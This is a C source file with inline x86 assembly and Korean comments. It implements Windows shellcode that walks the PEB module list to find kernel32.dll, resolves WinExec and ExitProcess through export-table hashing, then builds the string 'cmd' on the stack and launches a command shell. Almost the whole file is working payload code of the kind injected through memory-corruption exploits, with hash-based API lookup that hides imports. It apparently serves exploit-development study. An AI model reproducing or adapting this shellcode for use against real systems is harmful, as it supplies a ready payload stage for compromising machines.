
#include <windows.h>

int main()
{

	__asm
	{

		mov ebp, esp
			//셸코드가 보호될만한 충분한 크기의 스택을 확보
			sub esp, 1000h





			//EBX = PEB 시작 주소
			mov ebx, fs :[0x30]

			//EBX = PEB.Ldr 주소
			mov ebx, dword ptr[ebx + 0xc]

			//EBX = Ldr.InMemoryOrderModuleList
			mov ebx, dword ptr[ebx + 0x14]

			//BaseDllName의 버퍼 주소를 가져옴
			mov eax, dword ptr[ebx + 28h]

		SEARCHDLL :

			//eax에 비교해보려는 문자열 주소가 있음
			//인자로 KERNEL32.dll의 해시 결과를 넣었음
			push 330h
				call FIND

				//찾던 DLL을 찾은 경우
				cmp eax, 1
				jz SEARCHFUNC


				//없으면 다음 LDR_DATA_TABLE_ENTRY를 찾아봄
			FINDNEXT :

			//리스트에서 다음 DLL의 LDR_DATA_TABLE_ENTRY를 가져옴
			mov ebx, dword ptr[ebx]

				//BaseDllName의 버퍼 주소를 가져옴
				mov eax, dword ptr[ebx + 28h]

				jmp SEARCHDLL


				//------------함수 구현------------------

				//FIND(int findThisHash)
				//인자로 해시 값을 받음. EAX에 있는 문자열을 hash처리한 후 비교
				/*
				bool FIND(WCHAR * buf, int hashVal)
				{
				if(HASH_UNICODE(buf) == hashVal)
				return TRUE;
				else
				return FALSE;
				}
				*/
			FIND:
			call HASH_UNICODE

				//인자로 받은 해시와 비교
				cmp ecx, dword ptr[esp + 4]

				//해시 값이 맞다면 점프
				jz EQUAL

			NOTEQUAL :
			mov eax, 0
				jmp FINDDLLEND
			EQUAL :
			mov eax, 1

			FINDDLLEND :
					   //인자 스택 정리 하고 나감
					   ret 4


					   //EAX에 있는 문자열을 hash처리
					   /*
					   int HASH_UNICODE(WCHAR * bufl)
					   {
					   int result = 0;

					   while(*buf != 0)
					   {
					   result += *buf;
					   buf ++;
					   }
					   }
					   */
				   HASH_UNICODE:
			xor ecx, ecx

				//EAX에 있는 문자열을 이용하여 hash를 생성
			WHILE_NOT_NULL :
			xor edx, edx
				mov dx, word ptr[eax]
				add ecx, edx
				add eax, 2

				cmp word ptr[eax], 0
				jnz WHILE_NOT_NULL

				//해시 완성, 돌아감
				ret

				//_____________함수 구현_____________




				//-------------함수 주소 찾기용 루틴--------------
			SEARCHFUNC:
			//DLL의 PE iamge 시작 주소 얻기
			mov ebx, dword ptr[ebx + 10h]
				push ebx

				//DOS 헤더의 e_lfanew를 얻어옴 (NT 헤더의 위치)
				mov ecx, dword ptr[ebx + 3Ch]

				//EBX = NT 헤더 위치
				add ebx, ecx

				//32비트 기준으로, EBX = imagebase + optionalHeader.dataDirectory.exportTable.virtualAddress
				mov ebx, dword ptr[ebx + 78h]
				add ebx, dword ptr[esp]

				//1) AddressOfNames 테이블에 접근
				mov ecx, dword ptr[esp]
				mov eax, dword ptr[esp]
				add ecx, dword ptr[ebx + 20h]

				//NumerOfNames 
				mov edi, dword ptr[ebx + 18h]

				xor esi, esi

				//WinExec 해시를 인자로 넣음
				push 2b3h
				call FIND_FUNC

				//적절한 함수를 찾지 못했다면 나감
				cmp eax, 0
				jz ENDALL

				//적절한 함수를 찾았다면
				//ESI에 있는 인덱스를 이용하여 AddressOfOrdinals 배열에 접근
				mov edi, dword ptr[esp]
				add edi, dword ptr[ebx + 24h]

				//eax = WinExec의 서수
				xor eax, eax
				mov ax, word ptr[edi + esi * 2]

				//AddressOfFunctions에 접근
				mov edi, dword ptr[esp]
				add edi, dword ptr[ebx + 1Ch]


				//AddressOfFunctions[eax]에 접근
				mov esi, [esp]
				add esi, dword ptr[edi + eax * 4]


				pop eax
				//구한 WinExec 주소를 스택에 넣어둠
				push esi

				//다시 image base를 스택에 넣음
				//	ExitProcess 주소를 구하기 위해 함수를 재호출하기 위함
				push eax

				//1) AddressOfNames 테이블에 접근
				mov ecx, dword ptr[esp]
				mov eax, dword ptr[esp]
				add ecx, dword ptr[ebx + 20h]

				//NumerOfNames 
				mov edi, dword ptr[ebx + 18h]

				xor esi, esi

				//ExitProcess 해시를 인자로 넣음
				push 479h
				call FIND_FUNC

				//적절한 함수를 찾지 못했다면 나감
				cmp eax, 0
				jz ENDALL

				//적절한 함수를 찾았다면
				//ESI에 있는 인덱스를 이용하여 AddressOfOrdinals 배열에 접근
				mov edi, dword ptr[esp]
				add edi, dword ptr[ebx + 24h]

				//eax = ExitProcess의 서수
				xor eax, eax
				mov ax, word ptr[edi + esi * 2]

				//AddressOfFunctions에 접근
				mov edi, dword ptr[esp]
				add edi, dword ptr[ebx + 1Ch]

				//AddressOfFunctions[eax]에 접근
				mov esi, [esp]
				add esi, dword ptr[edi + eax * 4]

				pop eax
				//구한 ExitProcess주소를 스택에 넣어둠
				push esi

				jmp EXPLOIT


			FIND_FUNC :

			//이름 배열을 다 돌았다면 루프 끝냄
			cmp esi, edi
				je END_FIND_FUNC

				//AddressOfNames[i] 접근 -> 문자열 주소 얻어옴
				mov eax, dword ptr[esp + 8]
				add eax, dword ptr[ecx + esi * 4]

				//ECX를 임시 저장소로 사용하기 위해 원래 있던 값을 백업
				push ecx

				//해시 및 비교
				call HASH_ASCII

				//인자로 받은 해시와 비교
				cmp ecx, dword ptr[esp + 8]

				//ECX 값 복원
				pop ecx

				//해시 값이 맞다면 점프
				jz EQUAL_ASCII

			NOTEQUAL_ASCII :
			//다음 인덱스를 찾아봄
			inc esi
				mov eax, 0
				jmp FIND_FUNC

			EQUAL_ASCII :
			//함수를 찾았다면
			//끝냄
			mov eax, 1

			END_FIND_FUNC :
						  ret 4

						  //EAX에 있는 문자열을 hash처리
						  /*
						  int HASH_ASCII(char * bufl)
						  {
						  int result = 0;

						  while(*buf != 0)
						  {
						  result += *buf;
						  buf ++;
						  }
						  }
						  */
					  HASH_ASCII:


			xor ecx, ecx

				//EAX에 있는 문자열을 이용하여 hash를 생성
			WHILE_NOT_NULL_ASCII :
			xor edx, edx
				mov dl, byte ptr[eax]
				add ecx, edx
				add eax, 1

				cmp byte ptr[eax], 0
				jnz WHILE_NOT_NULL_ASCII

				//해시 완성, 돌아감
				ret

				//_____________함수 주소 찾기용 루틴_____________


			EXPLOIT :



			//'cmd'문자열 주소
			lea			eax, [esp - 4]

				//'\0'
				xor			ebx, ebx
				//'d'
				add			ebx, 64h
				shl			ebx, 8h
				//'m'
				add			ebx, 6Dh
				shl			ebx, 8h
				//'c'
				add			ebx, 63h

				//스택에 문자열 저장
				push ebx

				//WinExec 인자 - SW_SHOW
				push        5

				//WinExec 인자 - 'cmd'문자열 주소
				push eax

				//WinExec 호출
				call dword ptr[esp + 10h]


				//ExitProcess 호출

				push        1
				call dword ptr[esp + 0x8]

			ENDALL:
	}
}

